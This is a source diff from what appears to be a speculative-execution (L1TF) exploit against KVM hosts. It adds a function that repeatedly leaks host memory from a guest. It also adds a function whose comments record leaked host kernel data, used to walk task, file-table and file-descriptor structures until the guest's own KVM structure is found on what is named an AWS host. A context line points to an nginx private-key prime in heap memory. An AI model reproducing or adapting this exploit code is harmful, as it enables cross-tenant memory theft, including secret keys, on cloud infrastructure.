@@ -1523,3 +1523,169 @@ void reverse_nginx(void)
 {
 	// At offset 0x008b9a2 from the start of the heap of nginx lies the first prime of the private key. (nginx master process)
 }
+
+void reverse_kvm_module(hpa_t base)
+{
+	hpa_t vcpu = -1; //OWN_VCPU - HOST_DIRECT_MAP;
+	dump(vcpu);
+
+	while (1) {
+		char data[0x10];
+		for (int i = 0; i < 100; i++) {
+			l1tf_leak(data, base, vcpu+0x10, sizeof(data));
+			display(data, sizeof(data));
+		}
+	}
+	//   0:  ffff936a91dba828   28 a8 db 91 6a 93 ff ff (...j...
+	//   8:  ffffffff8555d368   68 d3 55 85 ff ff ff ff h.U.....
+
+	//    0:  ffffab3801795000   00 50 79 01 38 ab ff ff .Py.8...
+	//    8:                 0   00 00 00 00 00 00 00 00 ........
+	//   10:  ffff93f671ad5280   80 52 ad 71 f6 93 ff ff .R.q....
+	//   18:  ffffffff89e122f0   f0 22 e1 89 ff ff ff ff ."......
+	//   20:                 0   00 00 00 00 00 00 00 00 ........
+	//   28:                 0   00 00 00 00 00 00 00 00 ........
+}
+
+
+void reverse_aws_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu, hva_t task)
+{
+	printf("\nfind_own_kvm_via_fds(base=%lx, hdm=%lx, vcpu=%lx, task=%lx)\n" HLINE, base, hdm, vcpu, task);
+
+	// dump(task);
+	// dump((u64)H_TASK_COMM);
+	// reverse_after(base, task-hdm+H_TASK_COMM, hdm, "task+0xc38");
+	//                           task = ffff93f671ad4ce0
+	//                          0xc48 =              c48
+	// dm ffff93f671ad5928 | pa   12b1ad5928 |       task+0xc38+   0 = 353934343a6d6f64
+	// dm ffff93f671ad5930 | pa   12b1ad5930 |       task+0xc38+   8 =   35363134343639
+	// dm ffff93f671ad5938 | pa   12b1ad5938 |       task+0xc38+  10 =                0
+	// dm ffff93f671ad5940 | pa   12b1ad5940 |       task+0xc38+  18 =                0
+	// dm ffff93f671ad5948 | pa   12b1ad5948 |       task+0xc38+  20 =                0
+	// dm ffff93f671ad5950 | pa   12b1ad5950 |       task+0xc38+  28 = ffff93f6742f1040
+	// dm ffff93f671ad5958 | pa   12b1ad5958 |       task+0xc38+  30 = ffff93f673b38dc0 <-- files
+	// dm ffff93f671ad5960 | pa   12b1ad5960 |       task+0xc38+  38 = ffff93f60692c480
+	// dm ffff93f671ad5968 | pa   12b1ad5968 |       task+0xc38+  40 = ffff93f67423f080
+	// dm ffff93f671ad5970 | pa   12b1ad5970 |       task+0xc38+  48 = ffff93f6742339c0
+	// dm ffff93f671ad5978 | pa   12b1ad5978 |       task+0xc38+  50 = fffffffc3ffbf037
+	// dm ffff93f671ad5980 | pa   12b1ad5980 |       task+0xc38+  58 =                0
+	// dm ffff93f671ad5988 | pa   12b1ad5988 |       task+0xc38+  60 =                0
+	// dm ffff93f671ad5990 | pa   12b1ad5990 |       task+0xc38+  68 = ffff93f671ad5990
+	// dm ffff93f671ad5998 | pa   12b1ad5998 |       task+0xc38+  70 = ffff93f671ad5990
+	// dm ffff93f671ad59a0 | pa   12b1ad59a0 |       task+0xc38+  78 =                0
+	// dm ffff93f671ad59a8 | pa   12b1ad59a8 |       task+0xc38+  80 =                0
+	// dm ffff93f671ad59b0 | pa   12b1ad59b0 |       task+0xc38+  88 =                0
+	// dm ffff93f671ad59b8 | pa   12b1ad59b8 |       task+0xc38+  90 =                2
+	// dm ffff93f671ad59c0 | pa   12b1ad59c0 |       task+0xc38+  98 =                0
+	// dm ffff93f671ad59c8 | pa   12b1ad59c8 |       task+0xc38+  a0 =        200000002
+	// Conclusion: H_TASK_FILES = H_TASK_COMM + 0x30
+	
+	// hva_t files = 0xffff93f673b38dc0; dump(files);
+	// reverse_after(base, files-hdm, hdm, "files");
+	//                          files = ffff93f673b38dc0
+	// dm ffff93f673b38dc0 | pa   12b3b38dc0 |            files+   0 = ffff930000000003
+	// dm ffff93f673b38dc8 | pa   12b3b38dc8 |            files+   8 = ffff93f600000000
+	// dm ffff93f673b38dd0 | pa   12b3b38dd0 |            files+  10 = ffff93f673b38dd0
+	// dm ffff93f673b38dd8 | pa   12b3b38dd8 |            files+  18 = ffff93f673b38dd0
+	// dm ffff93f673b38de0 | pa   12b3b38de0 |            files+  20 = ffff93e461a4d5c0 <-- fdt
+	// dm ffff93f673b38de8 | pa   12b3b38de8 |            files+  28 = ffff93e400000040
+	// dm ffff93f673b38df0 | pa   12b3b38df0 |            files+  30 = ffff93f673b38e60
+	// dm ffff93f673b38df8 | pa   12b3b38df8 |            files+  38 = ffff93f673b38e48
+	// dm ffff93f673b38e00 | pa   12b3b38e00 |            files+  40 = ffff93f673b38e50
+	// Conclusion: H_FILES_FDT = 0x20
+                 
+
+	// hva_t fdt = 0xffff93e461a4d5c0; dump(fdt);
+	// reverse_after(base, fdt-hdm, hdm, "fdt");
+	//                            fdt = ffff93e461a4d5c0
+	// dm ffff93e461a4d5c0 | pa     a1a4d5c0 |              fdt+   0 =        100008000
+	// dm ffff93e461a4d5c8 | pa     a1a4d5c8 |              fdt+   8 = ffff93e45b3c0000 <-- fd
+	// dm ffff93e461a4d5d0 | pa     a1a4d5d0 |              fdt+  10 = ffff93e45adad000
+	// dm ffff93e461a4d5d8 | pa     a1a4d5d8 |              fdt+  18 = ffff93e45adac000
+	// dm ffff93e461a4d5e0 | pa     a1a4d5e0 |              fdt+  20 = ffff93e45adae000
+	// dm ffff93e461a4d5e8 | pa     a1a4d5e8 |              fdt+  28 = ffff93e461a4d5e0
+	// dm ffff93e461a4d5f0 | pa     a1a4d5f0 |              fdt+  30 =                0
+	// Conclusion: H_FDTABLE_FD = 0x8
+
+	// hva_t fd = 0xffff93e45b3c0000; dump(fd);
+	// reverse_after(base, fd-hdm, hdm, "fd");
+	//                             fd = ffff93e45b3c0000
+	// dm ffff93e45b3c0000 | pa     9b3c0000 |               fd+   0 = ffff93e3c6600800
+	// dm ffff93e45b3c0008 | pa     9b3c0008 |               fd+   8 = ffff93e3c6600800
+	// dm ffff93e45b3c0010 | pa     9b3c0010 |               fd+  10 = ffff93e3c6600800
+	// dm ffff93e45b3c0018 | pa     9b3c0018 |               fd+  18 = ffff93e3dfd33100
+	// dm ffff93e45b3c0020 | pa     9b3c0020 |               fd+  20 = ffff93e45b197700
+	// dm ffff93e45b3c0028 | pa     9b3c0028 |               fd+  28 = ffff93e45b197000
+	// Conclusion: the (struct file *)-array starts at `fd`
+
+	// hva_t fd0 = 0xffff93e3c6600800; dump(fd0);
+	// reverse_after(base, fd0-hdm, hdm, "fd0");
+	// OUTPUT MISSING BUT THIS SHOWS THE 0x100 bytes of a `struct file`,
+	// indicating where private_data might be, due to it being a valid pointer
+	// for stdin (fd=0).
+
+	// hva_t fd_data[0x30];
+	// leak(fd_data, base, fd-hdm, sizeof(fd_data));
+	// display(fd_data, sizeof(fd_data));
+	// hva_t fd_data[0x30] = {
+	// 	0xffff93e3c6600800,
+	// 	0xffff93e3c6600800,
+	// 	0xffff93e3c6600800,
+	// 	0xffff93e3dfd33100,
+	// 	0xffff93e45b197700,
+	// 	0xffff93e45b197000,
+	// 	0xffff93e3dfd32800,
+	// 	0xffff93e3dfd33d00,
+	// 	0xffff93e45b196000,
+	// 	0xffff93e45b197400,
+	// 	0xffff93e45b196900,
+	// 	0xffff93e45b197d00,
+	// 	0xffff93e45b197200,
+	// 	0xffff93e45b197500,
+	// 	0xffff93e45b196200,
+	// 	0xffff93e45b197a00,
+	// 	0xffff93e45b197600,
+	// 	0xffff93e45b197e00,
+	// 	0xffff93e45b197100,
+	// 	0xffff93e45b196100,
+	// 	0xffff93e45b196f00,
+	// 	0xffff93e45b196e00,
+	// 	0xffff93e45b196700,
+	// 	0xffff93e45b197f00,
+	// 	0xffff93e45b196800,
+	// 	0xffff93e45b197300,
+	// 	0xffff93e45b196600,
+	// 	0xffff93e45b197900,
+	// 	0xffff93e45b196400,
+	// 	0xffff93e45b197c00,
+	// 	0xffff93e45b196a00,
+	// 	0xffff93e45b190d00,
+	// 	0xffff93e45b190000,
+	// 	0xffff93e45b191d00,
+	// 	0xffff93e45b191700,
+	// 	0xffff93e45b191100,
+	// 	0xffff93e45b190f00,
+	// 	0xffff93e45b190e00,
+	// 	0xffff93e45b191300,
+	// 	0xffff93e45b191c00,
+	// 	0xffff93e45b190600,
+	// 	0xffff93e45b197800,
+	// 	0xffff93e45b190400,
+	// 	0xffff93e45b192b00,
+	// 	0xffff93e45b18b600
+	// };
+
+	// For all candidate private_data offsets (0xc0 and 0xe8 below), try to
+	// find a vmalloc-ed pointer: candidate for our `struct kvm`.
+	// for (int i = 0; i < 0x30; i++) {
+	// 	dump(i);
+	// 	dump(fd_data[i]);
+	// 	reverse_after(base, fd_data[i]-hdm+0xc0, hdm, "fd_data[i]+0xc0", 0x8);
+	// 	reverse_after(base, fd_data[i]-hdm+0xe8, hdm, "fd_data[i]+0xe8", 0x8);
+	// }
+	// FOUND: at fd[9]+0xc0, we see our own kvm pointer.
+
+	hva_t kvm_candidate = 0xffff93e45b1974c0; // at fd[9] + 0xc0
+	dump(leak64(base, kvm_candidate-hdm));
+	dump(OWN_KVM);
+}
